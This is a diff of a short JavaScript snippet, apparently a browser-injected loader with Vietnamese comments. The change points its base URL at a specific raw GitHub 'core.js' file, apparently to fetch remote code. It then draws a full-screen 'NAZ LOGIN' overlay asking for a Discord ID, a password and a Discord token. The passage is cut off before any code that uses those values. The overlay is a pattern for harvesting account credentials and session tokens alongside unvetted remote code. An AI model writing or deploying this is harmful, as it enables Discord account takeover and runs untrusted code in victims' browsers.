@@ -1,6 +1,6 @@
 (async()=>{
   // 🔴 THAY LINK GITHUB CỦA BẠN
-  const BASE = "https://raw.githubusercontent.com/USERNAME/REPO/main/";
+  const BASE = "https://raw.githubusercontent.com/huihoangadm/nazowtl/refs/heads/main/core.js";
 
   const ui=document.createElement("div");
   ui.innerHTML=`<style>.z{position:fixed;inset:0;background:#000e;z-index:99999;display:flex;justify-content:center;align-items:center;font-family:sans-serif}.b{background:#09090b;padding:25px;border:1px solid #333;border-radius:10px;width:280px;text-align:center}.i{width:100%;padding:10px;margin:5px 0;background:#18181b;border:1px solid #3f3f46;color:#fff;border-radius:5px;box-sizing:border-box}.btn{width:100%;padding:10px;margin-top:10px;background:#a855f7;color:#fff;border:none;border-radius:5px;cursor:pointer;font-weight:bold}.btn:hover{opacity:0.8}</style><div class=z><div class=b><h2 style="color:#fff;margin:0 0 15px">🔐 NAZ LOGIN</h2><input id=uid class=i placeholder="Discord ID"><input id=pass type=password class=i placeholder="Mật khẩu"><input id=token type=password class=i placeholder="Token Discord"><button id=go class=btn>LOGIN & START</button></div></div>`;
